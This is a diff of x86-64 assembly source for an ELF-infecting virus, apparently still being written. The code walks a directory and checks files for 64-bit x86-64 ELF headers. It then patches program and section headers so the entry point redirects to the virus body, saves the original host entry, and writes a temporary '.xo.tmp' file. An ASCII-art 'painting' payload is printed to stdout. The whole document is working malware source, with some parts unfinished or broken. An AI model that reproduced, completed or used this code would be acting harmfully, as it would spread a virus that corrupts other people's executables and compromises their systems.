@@ -90,10 +90,16 @@ SYS_OPEN 		equ 0x2
 SYS_CLOSE 		equ 0x3
 SYS_FSTAT 		equ 0x5
 SYS_MMAP 		equ 0x9
+SYS_MUNMAP		equ 0xB
 SYS_PREAD64 	equ 0x11
 SYS_PWRITE64 	equ 0x12
 SYS_EXIT		equ 0x3c
 SYS_GETDENTS64	equ 0x4e
+SYS_CREAT		equ 0x55
+
+
+PAGESIZE equ 4096	
+
 
 teststr db 'boo', 13,10,0
 teststrlen equ $-teststr
@@ -135,9 +141,14 @@ checkarchfaillen equ $-checkarchfail
 elf_header: times 4 dq 0
 file_stat_temp: times 13 dq 0
 
+evaddr: dq 0
+
+oshoff: dq 0
+
 vxhostentry: dq 0
 vxoffset: dq 0
-ventry equ $+vstart 
+
+ventry equ $_start 
 
 fd:	dq 0
 fdlen equ $-fd
@@ -150,8 +161,13 @@ STDOUT			equ 0x1
 
 ;open() syscall parameter reference 
 OPEN_RDWR		equ 0x2
+O_WRONLY		equ 0x1
 O_RDONLY		equ 0x0
 
+
+O_CREAT			equ 100o
+O_TRUNC			equ 1000o
+O_APPEND		equ 2000o
 
 S_IFREG    		dq 0x0100000   ;regular file
 S_IFMT 			dq 0x0170000
@@ -177,6 +193,9 @@ ETYPE_EXEC		equ 0x2
 ;D_TYPE values
 DT_REG 			equ 0x8
 
+
+PT_LOAD 		equ 0x1
+
 ;MAX_RDENT_BUF:	db 0x200 dup (?)
 MAX_RDENT_BUF	times 0x400 db 0 
 MAX_RDENT_BUF_SIZE equ 0x400
@@ -189,14 +208,14 @@ root_dirent:	dq 0
 
 ;;file pointed to by fstat is fd
 section .text
-global vstart
-vstart:
-	push rbp
-	mov rbp, rsp
-	sub rsp, 0x600
+global _start
+_start:
+	;push rbp
+	;mov rbp, rsp
+	sub rsp, 0x1000
 	mov r14, rsp
 
-	_getdirents:
+_getdirents:
 ;****************************************************************************************
 ; open - syscall 0x2
 ;;open(filename, flags, mode);
@@ -336,8 +355,8 @@ check_file:
 			jne .copy_filename
 
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
-		lea r13, [r14 + 200]
-		call _write
+	;;	lea r13, [r14 + 200]
+	;;	call _write
 		xor rax, rax
 		;mov [r14 + 500], rax				;save fd to opened file at designated spot on the stack
 	
@@ -412,8 +431,9 @@ check_file:
 		syscall
 	
 		pop rax
-		cmp rax, 0
-		jb checknext
+		test rax, rax
+		;cmp rax, 0
+		js checknext
 		;test rax, rax
 		;js checknext
 	check_elf_header_etype:
@@ -436,18 +456,20 @@ check_file:
 		;cmp dword [rax], 0x464c457f
 		;cmp dword [elf_header], 0x464c457f
 		jnz checknext
-		lea r13, checkelfpass
-		mov r12, checkelfpasslen
-		call _write
+		
+		;;lea r13, checkelfpass
+		;;mov r12, checkelfpasslen
+		;;call _write
 	check_elf_header_64bit:
 		;cmp dword [r14+800+elf_ehdr.e_ident+4], ELFCLASS64
 		lea r13, check64fail
 		mov r12, check64faillen
 		cmp byte [elf_header+4], ELFCLASS64
 		jne checknext
-		lea r13, check64pass
-		mov r12, check64passlen
-		call _write
+		
+		;;lea r13, check64pass
+		;;mov r12, check64passlen
+		;;call _write
 ;		jmp _restore
 	
 	check_elf_header_arch:
@@ -455,14 +477,16 @@ check_file:
 		mov r12, checkarchfaillen
 		cmp byte [elf_header+18], 0x3e
 		jne checknext
-		lea r13, checkarchpass
-		mov r12, checkarchpasslen
-		call _write
+		
+		;;lea r13, checkarchpass
+		;;mov r12, checkarchpasslen
+		;;call _write
 		;jmp _restore
 		
-		ready2infect:
-			jmp painting
-			;call infect	
+	ready2infect:
+		;push rax
+		call infect	
+		jmp painting
 
 
 
@@ -481,7 +505,7 @@ check_file:
 
 
 	painting:
-		call payload
+	call payload
 		db 0x2a,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x25
 		db 0xa,0x50,0x50,0x50,0x50,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a
 		db 0x2a,0xa,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x2a
@@ -521,7 +545,7 @@ check_file:
 		db 0x2b,0x2b,0x2b,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x2b,0x50,0x2a,0x50,0x50,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x2c
 		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x2b,0xa,0x59,0x59,0x59,0x2b,0x2a,0x2a,0x2a,0x2a,0x2a,0x50,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24
 		db 0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0xa,0x59,0x59,0x2b,0x2b,0x2a,0x25,0x2a,0x2a,0x50,0x2b,0x2b,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
-	payload_len equ $-painting
+	payload_len equ $-painting+3
 	
 payload:
 	pop rsi
@@ -529,7 +553,10 @@ payload:
 	mov rax, SYS_WRITE
 	mov rdi, STDOUT
 	syscall
-		
+	
+	jmp _restore
+
+;jmp frankenstein_elf		
 ;****************************************************************************************
 ;	Infection routine:
 ;
@@ -559,15 +586,17 @@ payload:
 ;****************************************************************************************
 
 infect:
+	;sub rsp, 0x8
 	push rbp
-	mov rsp, rbp
+	mov rbp, rsp
 	mov r13, rax
-	mov r12, [rax + elf_ehdr.phoff]		;address of host ELF Program Header Table in r12
-	mov r15, [rax + elf_ehdr.shoff] 	;address of host ELF Section Header Table in r15
+	jmp frankenstein_elf
+	mov r12, [rax + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
+	mov r15, [rax + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
 
 	
-	mov [vxhostentry], [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
-
+	mov qword r11, [rax + elf_ehdr.e_entry] ;save original host file entry point for jmp in vx code
+	mov qword [vxhostentry], r11
 ;****************************************************************************************
 ;	Update program headers of infected ELF
 ;
@@ -580,7 +609,7 @@ infect:
 ;
 ;****************************************************************************************
 	;mov word rcx, [rax + elf_ehdr.e_phnum]
-	mov word rdx, [rax + elf_ehdr.e_phentsize]
+	;mov rdx, [rax + elf_ehdr.e_phentsize]
 
 	xor rcx, rcx
 	check_phdrs:
@@ -588,67 +617,64 @@ infect:
 		.phdr_loop:
 			cmp rcx, 0
 			jg .mod_subsequent_phdr		
-			cmp [r12 + elf_phdr.p_type], PT_LOAD			
+			cmp byte [r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			mov r10, [r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
 			add r10, [r12 + elf_phdr.p_filesz]
-			add r10, [ventry]				;new entry point = evaddr + ventry
+			add qword r10, [ventry]				;new entry point = evaddr + ventry
 			mov qword [evaddr], r10
 			mov [rax + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
-			mov [vx_offset], [r12 + elf_phdr.p_offset] 
-			add [vx_offset], [r12 + elf_phdr.p_filesz]				
-			add [r12 + elf_phdr.p_filesz], vlen	
-			add [r12 + elf_phdr.p_memsz], vlen	
+			mov r10, [r12 + elf_phdr.p_offset] 
+			add r10, [r12 + elf_phdr.p_filesz]				
+			mov qword [vxoffset], r10
+			add qword [r12 + elf_phdr.p_filesz], vlen	
+			add qword [r12 + elf_phdr.p_memsz], vlen	
 
 			.mod_subsequent_phdr:
-				add [r12 + elf_phdr.p_offset], PAGESIZE
+				add qword [r12 + elf_phdr.p_offset], PAGESIZE
 		;.next_phdr:
 		pop rcx
 		inc rcx 
-		add r12, rdx 
+		;add r12, rdx 
+		;add word r12d, [rax+ elf_ehdr.e_phentsize]
 		cmp rcx, [rax + elf_ehdr.e_phnum]
-		jl .phdr loop
-
+		jl .phdr_loop
+	jmp frankenstein_elf
 ;****************************************************************************************
 ;	Now update section headers of infected ELF
 ;****************************************************************************************
 
-	mov word rdx, [rax + elf_ehdr.e_shentsize]
+	mov rdx, [rax + elf_ehdr.e_shentsize]
 	xor r11, r11
 	xor rcx, rcx
 	check_shdrs:
 		push rcx
 		.shdr_loop:
-			cmp [r15 + elf_shdr.sh_offset], [vx_offset]	
+			cmp qword [r15 + elf_shdr.sh_offset], vxoffset
 			jge .mod_subsequent_shdr
 			mov r11, [r15 + elf_shdr.sh_addr]
 			add r11, [r15 + elf_shdr.sh_size]
 			cmp r10, r11
-			jne .mod_subsequen_shdr
-			add [r15 + elf_shdr.sh_size], vlen
+			jne .mod_subsequent_shdr
+			add qword [r15 + elf_shdr.sh_size], vlen
 
 
 			.mod_subsequent_shdr:
-				add [r15 + elf_shdr.sh_offset], PAGESIZE
+				add qword [r15 + elf_shdr.sh_offset], PAGESIZE
 		;.next_shdr:
 		pop rcx
 		inc rcx 
 		add r15, rdx 
 		cmp rcx, [rax + elf_ehdr.e_shnum]
-		jl .phdr loop
+		jl .shdr_loop
 
-	mov [oshoff], [rax + elf_ehdr.e_shoff]
-	cmp [oshoff], [vxoffset]
+	mov r11, qword [rax + elf_ehdr.e_shoff]
+	mov qword [oshoff], r11
+	cmp qword r11, [vxoffset]
 	;jg .patch_ehdr_shoff
 	jl frankenstein_elf
-
+	jmp fin_infect
 	
-
-
-
-	pop rbp
-
-	jmp printteststr
 	
 
 ;****************************************************************************************
@@ -693,30 +719,61 @@ infect:
 ;
 ;****************************************************************************************
 
-	frankenstein_elf:
+frankenstein_elf:
+	;mov r13, rax
+	;push 0	
+	;mov byte [r14+ 0xa00], 0x0
+	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
+	mov [r14 + 0x800], rax
+	lea rdi, [r14 + 0x800]			;name of file in rdi
+	mov rsi, 0777o					;mode - 755 (file perms for new file)
+	;mov rsi, (O_CREAT | O_TRUNC | O_WRONLY)
+	mov rax, SYS_CREAT
+	syscall
 	
-		push 0x706d742e6f782e				;temp filename = ".xo.tmp"
-		pop rdi							;name of file in rdi
-		mov rsi, OPEN_RDWR 				;flags - read/write in rsi
-		xor rdx, rdx					;mode - 0
-		mov rax, SYS_OPEN
-		syscall
+	mov r9, rax
+	mov rdi, rax
+
+	;write ELF header to temp file
+
+	mov rdx, 64
+	;lea rsi, [r13]
+	;lea rsi, elf_header
+	mov  rsi, r13
+;	mov qword rsi, [r14 + 800]					;r13 contains pointer to mmap'd file
+	mov rdi, r9
+	xor r10, r10
+;	mov rdi, STDOUT
+	mov rax, SYS_WRITE
+	;mov rax, SYS_PWRITE64
+	syscall
+	
+	;munmap file from work area
+;	lea rdi, [r13]
+;	mov qword rsi, [r14 + file_stat.st_size]
+;	mov rax, SYS_MUNMAP
+;	syscall
+
+	;close temp file
+
+	mov rdi, r9
+	mov rax, SYS_CLOSE
+	syscall
 
 
-
-
-
-
-
-
-
+fin_infect:
+	;add rsp, 0x8
+	mov rsp, rbp
+	pop rbp
+	ret
 
 
 
 ;;restore stack to original state
 _restore:
-	add rsp, 0x600
-	pop rbp
+	add rsp, 0x1000
+	;mov rsp, rbp
+	;pop rbp
 	
 ;exit
 _end:
@@ -724,7 +781,7 @@ _end:
 	mov rax, 0x3c ;exit() syscall on x64
 	syscall	
 
-vlen equ $-vstart
+vlen equ $-_start
 
 ;****************************************************************************************
 ;	paint function, writes buffer of 4 byte values (R G B Alpha) pixels to framebuffer
